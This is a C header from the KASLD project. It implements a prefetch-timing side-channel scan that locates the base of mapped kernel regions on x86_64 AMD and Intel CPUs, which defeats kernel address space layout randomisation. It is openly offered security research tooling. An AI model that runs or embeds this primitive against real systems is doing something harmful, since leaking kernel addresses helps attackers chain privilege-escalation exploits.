// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Prefetch timing-scan + mapped-region left-edge detection.
//
// Builds on the prefetch timing primitive in sidechannel.h to scan a window of
// KASLR-aligned slots and locate the LEFT EDGE of a contiguous mapped kernel
// region — the region base. Shared by the components that scan different
// windows for different region bases (kernel text, the direct map): the window
// base, step, slot count and iteration budget are all parameters, so the same
// collect + edge-detection logic serves any region.
//
// The base is the LEFT EDGE of the mapped run, not the extremum within it: the
// base slot carries a weaker signal than the hot body of the region, so keying
// off the extremum (or a body-tuned threshold) reports the base one slot high.
// Edge detection walks to the unmapped->mapped transition instead.
// ---
// <bcoles@gmail.com>

#ifndef KASLD_PREFETCH_SCAN_H
#define KASLD_PREFETCH_SCAN_H

#if !defined(__x86_64__) && !defined(__amd64__)
#error "prefetch_scan.h: x86_64 only"
#endif

#include "cpu.h"
#include "sidechannel.h"

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define PREFETCH_SCAN_WARMUP 3

// ---------------------------------------------------------------------------
// Collect per-slot prefetch timings for `n` slots [base, base + n*step), into
// times[0..n) (caller-allocated). The reducer depends on the CPU:
//   - AMD: mapped pages produce HIGHER latency; per-slot SUM across iterations
//     preserves the slow-vs-fast proportion even when the per-sample signal is
//     smaller than one (coarse) rdtscp quantum.
//   - Intel / unknown: mapped pages resolve FASTER (TLB hit); per-slot MIN
//     across iterations is the least-noised sample.
// No syscall between probes: this measures page-table-walk latency, which is
// static, so a syscall would only add noise.
// ---------------------------------------------------------------------------
__attribute__((unused)) static void
prefetch_scan_collect(uint64_t *times, size_t n, uint64_t base, uint64_t step,
                      int vendor, int iterations) {
  size_t idx;
  int i;

  if (vendor == CPU_VENDOR_AMD) {
    for (idx = 0; idx < n; idx++)
      times[idx] = 0;
    for (i = 0; i < PREFETCH_SCAN_WARMUP; i++)
      for (idx = 0; idx < n; idx++)
        time_prefetch(base + idx * step);
    for (i = 0; i < iterations; i++)
      for (idx = 0; idx < n; idx++)
        times[idx] += time_prefetch(base + idx * step);
  } else {
    for (idx = 0; idx < n; idx++)
      times[idx] = ~(uint64_t)0;
    for (i = 0; i < PREFETCH_SCAN_WARMUP + iterations; i++)
      for (idx = 0; idx < n; idx++) {
        uint64_t t = time_prefetch(base + idx * step);
        if (i >= PREFETCH_SCAN_WARMUP && t < times[idx])
          times[idx] = t;
      }
  }
}

// ---------------------------------------------------------------------------
// Dump per-slot timings to stderr (verbose diagnostics).
// ---------------------------------------------------------------------------
__attribute__((unused)) static void prefetch_scan_dump(const uint64_t *times,
                                                       size_t n, uint64_t base,
                                                       uint64_t step,
                                                       const char *stat) {
  size_t idx;
  fprintf(stderr, "# slot addr %s\n", stat);
  for (idx = 0; idx < n; idx++)
    fprintf(stderr, "%3zu 0x%lx %lu\n", idx, (unsigned long)(base + idx * step),
            (unsigned long)times[idx]);
}

static int prefetch_scan_cmp_u64(const void *a, const void *b) {
  uint64_t va = *(const uint64_t *)a;
  uint64_t vb = *(const uint64_t *)b;
  return (va > vb) - (va < vb);
}

// ---------------------------------------------------------------------------
// Index of the mapped region's LEFT EDGE (base slot) in times[0..n), or -1 if
// no mapped region is found. The median of the slots is the unmapped baseline
// (most slots are unmapped).
//
// AMD (sums, mapped reads HIGHER): the leftmost slot above a strict 1.5x-median
// threshold with >= confirm_k of the next confirm_m slots also above it — the
// confirmation window rejects isolated scheduler outliers and page-table
// boundary artifacts — then walk that cluster's left edge out to a looser
// 1.25x-median bound (the strict threshold is body-tuned and can drop the
// weaker base slot; unmapped slots sit at ~1.0x and never cross 1.25x, so the
// walk recovers the base and never lands below it). Returns -1 if no cluster.
//
// Intel / unknown (mins, mapped reads FASTER): the global minimum is a seed
// guaranteed to lie inside the mapped region (min-over-iterations removes
// upward noise, so no unmapped slot reads faster than a mapped one); walk LEFT
// from it to the unmapped->mapped transition, halting at the midpoint between
// the baseline and the fastest slot. Size-agnostic; confirm_* are unused here.
// ---------------------------------------------------------------------------
__attribute__((unused)) static long
prefetch_scan_find_edge(const uint64_t *times, size_t n, int vendor,
                        int confirm_k, int confirm_m) {
  if (n == 0)
    return -1;

  uint64_t *sorted = (uint64_t *)malloc(n * sizeof(uint64_t));
  if (!sorted)
    return -1;
  memcpy(sorted, times, n * sizeof(uint64_t));
  qsort(sorted, n, sizeof(uint64_t), prefetch_scan_cmp_u64);
  uint64_t median = sorted[n / 2];
  free(sorted);

  if (vendor == CPU_VENDOR_AMD) {
    uint64_t threshold = median + median / 2;
    uint64_t edge_bound = median + median / 4;
    size_t idx;
    for (idx = 0; confirm_m > 0 && idx + (size_t)confirm_m <= n; idx++) {
      if (times[idx] <= threshold)
        continue;
      int count = 0, j;
      for (j = 0; j < confirm_m; j++)
        if (times[idx + j] > threshold)
          count++;
      if (count >= confirm_k) {
        while (idx > 0 && times[idx - 1] > edge_bound)
          idx--;
        return (long)idx;
      }
    }
    return -1;
  }

  uint64_t min_time = ~(uint64_t)0;
  size_t seed = 0, idx;
  for (idx = 0; idx < n; idx++)
    if (times[idx] < min_time) {
      min_time = times[idx];
      seed = idx;
    }
  uint64_t edge_bound = median - (median - min_time) / 2;
  while (seed > 0 && times[seed - 1] < edge_bound)
    seed--;
  return (long)seed;
}

#endif /* KASLD_PREFETCH_SCAN_H */
